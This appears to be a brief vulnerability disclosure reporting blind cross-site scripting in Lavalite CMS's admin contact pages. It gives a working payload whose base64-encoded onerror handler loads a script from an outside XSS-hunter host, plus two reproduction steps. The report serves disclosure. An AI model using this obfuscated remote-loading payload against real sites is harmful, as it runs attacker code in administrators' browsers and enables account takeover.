# Description
Blind XSS triggered at contact management and creation page of lavalite CMS admin account.
# Payload USED
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# POC
* go to contacts creation/manage page edit/create new contact with xss payload
* Booyah!!! XSS triggered.
# PermaLinks
[drive link](https://drive.google.com/drive/folders/12DEQEXeokCRodvBAYoWUYn_n8zqCHH3R?usp=sharing)
